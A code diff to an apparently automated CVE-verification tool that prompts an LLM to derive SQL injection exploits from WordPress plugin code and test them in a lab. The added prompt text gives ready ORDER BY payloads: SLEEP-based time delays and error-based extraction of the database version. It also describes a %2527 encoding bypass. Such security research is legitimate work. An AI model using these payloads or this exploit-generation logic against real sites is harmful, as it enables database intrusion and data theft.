@@ -923,13 +923,22 @@ _HUECO_SQLI_SYS = (
     "detectado una variable de peticion HTTP que llega a $wpdb sin pasar por prepare(). "
     "No hay PoC publico: TU derivas el exploit leyendo el codigo real. "
     "SOLO razonas desde el codigo — nunca inventas datos. "
+    "IMPORTANTE — ORDER BY injection: si el escaner indica injection_type=orderby, "
+    "el parametro vulnerable NO es el de la clausula WHERE sino el que controla ORDER BY. "
+    "ORDER BY injection no necesita comillas ni bypass de escaping — el valor se interpola "
+    "directamente en la cluasula ORDER BY (p.ej. `ORDER BY u.{$sort}` donde $sort = $request['sorting']). "
+    "El payload tipico es 'ASC,(SELECT 1 FROM(SELECT SLEEP(5))x)' para time-based "
+    "o 'ASC,(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)' para error-based. "
+    "sqli_param debe ser el parametro ORDER BY, no el parametro WHERE. "
     "Responde SOLO con JSON valido con las claves: "
     "ajax_action (string EXACTO en add_action('wp_ajax_...' o 'wp_ajax_nopriv_...'), "
     "vacio si es endpoint REST), "
     "rest_route (ruta REST EXACTA de register_rest_route() si es REST, vacio si no), "
     "http_method (GET o POST segun la superglobal del parametro vulnerable), "
     "sqli_param (nombre EXACTO del parametro que llega a la query SQL sin prepare; "
+    "para ORDER BY injection, el parametro que controla el ORDER BY; "
     "si el taint viene de $_SERVER['REQUEST_URI'] escribe 'REQUEST_URI' aqui), "
+    "sqli_via_orderby (true si la inyeccion es en clausula ORDER BY interpolada sin prepare, false en caso contrario), "
     "sqli_taint_source (donde el valor tainted entra al codigo: query_param|REQUEST_URI|header|cookie|rawurldecode — pon 'rawurldecode' si el plugin llama a rawurldecode() o sanitize_title con un filtro que revierte la sanitizacion, como CVE-2026-39732), "
     "sqli_via_request_uri (true si el taint source es $_SERVER['REQUEST_URI'] y la inyeccion va en el PATH HTTP, false en caso contrario), "
     "sqli_via_rawurldecode (true si el slug/param pasa por rawurldecode() o sanitize_title filter DESPUES de que WordPress lo haya sanitizado — el payload debe ser %2527 en el wire para que rawurldecode() lo convierta en apostrofo; false en caso contrario), "
@@ -937,7 +946,7 @@ _HUECO_SQLI_SYS = (
     "subscriber si hay check_ajax_referer pero cualquier usuario logueado puede; "
     "editor o admin si exige un rol especifico), "
     "sqli_technique (error-based | union-based | boolean-blind | time-based), "
-    "payload_hint (payload minimo de prueba), "
+    "payload_hint (payload minimo de prueba; para ORDER BY injection usa payload ORDER BY sin comillas), "
     "parameters (lista de TODOS los parametros que el handler lee de $_POST/$_GET/$_REQUEST), "
     "reasoning (una linea explicando por que la vulnerabilidad existe en este codigo)."
 )
@@ -6908,6 +6917,9 @@ def _hueco_code_analysis(inv: "Investigation", fr: Any, llm: Any, step: Any, es:
         snippet = _read_snippet(taint.get("file", ""), taint.get("line", 0))
         if not snippet:
             return
+        _inj_type = taint.get("injection_type", "")
+        _inj_type_line = (f"Tipo de inyeccion detectado por escaner: {_inj_type}\n"
+                          if _inj_type else "")
         try:
             raw = llm.chat([
                 Message("system", _HUECO_SQLI_SYS),
@@ -6915,6 +6927,7 @@ def _hueco_code_analysis(inv: "Investigation", fr: Any, llm: Any, step: Any, es:
                     f"CVE: {inv.cve_id}\n"
                     f"Descripcion NVD: {(inv.description or '')[:300]}\n\n"
                     f"Parametro taintado encontrado por escaner: '{taint['param']}'\n"
+                    f"{_inj_type_line}"
                     f"Hook/endpoint detectado: {taint_hook or '(desconocido)'}\n\n"
                     f"=== CODIGO REAL DEL COMPONENTE ===\n```{_tech_code_fence(inv.tech or '')}\n{snippet[:4000]}\n```\n\n"
                     f"Extrae los datos exactos del exploit en JSON."
@@ -6947,6 +6960,10 @@ def _hueco_code_analysis(inv: "Investigation", fr: Any, llm: Any, step: Any, es:
         if _sp and not notes.get("sqli_param"):
             inv.llm_notes["sqli_param"] = _sp
             changed.append(f"sqli_param={_sp}")
+        # ORDER BY injection flag — feeds into sqli verifier to use ORDER BY payloads
+        if hint.get("sqli_via_orderby") is True or _inj_type == "orderby":
+            inv.llm_notes["sqli_via_orderby"] = True
+            changed.append("via_orderby=true")
         _tech = (hint.get("sqli_technique") or "").strip()
         if _tech and not notes.get("sqli_technique"):
             inv.llm_notes["sqli_technique"] = _tech
@@ -14987,6 +15004,7 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                     or "%2527" in (notes.get("strategy") or "").lower()
                     or "%2527" in (notes.get("poc_notes") or "").lower()
                 )
+                _via_orderby = bool(notes.get("sqli_via_orderby"))
                 wr = verify_wordpress_sqli(
                     fr.local_path, plugin_dir, _sqli_ep,
                     _sqli_http_method, params,
@@ -14999,7 +15017,8 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                     _lab_ref=_sqli_lab_ref,
                     json_body=bool(notes.get("json_body")),
                     sqli_via_request_uri=_via_uri,
-                    sqli_via_rawurldecode=_via_rawurldecode)
+                    sqli_via_rawurldecode=_via_rawurldecode,
+                    sqli_via_orderby=_via_orderby)
                 # aprendizaje y reintento: si no se confirmo pero SI hubo laboratorio real (no es
                 # un problema de infraestructura), se le pide al LLM que lea la MISMA evidencia
                 # real (cuerpo de la respuesta de control) que un analista humano leeria a mano --
@@ -15055,7 +15074,8 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                         _live_boot=_live,
                         json_body=bool(notes.get("json_body")),
                         sqli_via_request_uri=_via_uri,
-                        sqli_via_rawurldecode=_via_rawurldecode)
+                        sqli_via_rawurldecode=_via_rawurldecode,
+                        sqli_via_orderby=_via_orderby)
                 _ep_lock_active = bool(notes.get("analyst_endpoint_lock")
                                        or notes.get("poc_raw_http_lock")
                                        or notes.get("poc_llm_endpoint_lock"))
